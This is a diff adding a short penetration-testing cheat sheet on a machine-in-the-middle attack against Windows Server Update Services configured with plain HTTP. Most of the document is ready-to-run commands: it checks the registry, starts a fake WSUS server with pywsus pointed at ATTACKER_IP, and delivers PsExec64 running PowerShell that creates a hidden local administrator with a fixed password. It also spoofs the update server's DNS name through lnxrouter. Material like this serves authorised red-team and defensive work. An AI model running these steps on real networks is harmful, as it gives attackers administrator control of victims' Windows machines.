@@ -1,0 +1,33 @@
+---
+syntax: markdown
+---
+# MitM attack against WSUS
+
+If a Windows system fetches updates from a Windows Server Update Services (WSUS) server via plain HTTP, a machine-in-the-middle attack can be carried out.
+While the executable within the update needs to be signed by Microsoft, the parameters can be chosen arbitrarily.
+So use for example a copy of `PsExec64.exe` to execute commands which create a new local administrator.
+
+
+## Check Windows Update Settings
+
+- if vulnerable, the registry settings contain a plain HTTP URL for a WSUS server
+    reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+
+
+## Fake WSUS Server
+
+https://github.com/GoSecure/pywsus
+
+- start a fake WSUS server which delivers a malicious update in order to create a new local administrator
+    python pywsus.py -H ATTACKER_IP -p 8530 -e ~/srv/windows/PsExec64.exe -c '-accepteula -s powershell.exe -c "nlu wsus-admin -Password (ConvertTo-SecureString S0m3Pa55w0rd1337! -AsPlainText -Force) | algm -SID S-1-5-32-544"'
+
+
+## MitM position
+
+Use an arbitrary method to gain a MitM position.
+
+If the network cabling of the victim can be manipulated, gain a physical MitM position and use `lnxrouter` (https://github.com/garywill/linux-router).
+- create a hosts file mapping the WSUS server to the attacker's IP
+    echo ATTACKER_IP wsus.corp.com > /tmp/wsus.hosts
+- use `lnxrouter` for network setup
+    sudo ./lnxrouter -i INTERFACE_VICTIM -o INTERFACE_NETWORK -g 192.168.5.1 --log-dns -e /tmp/wsus.hosts
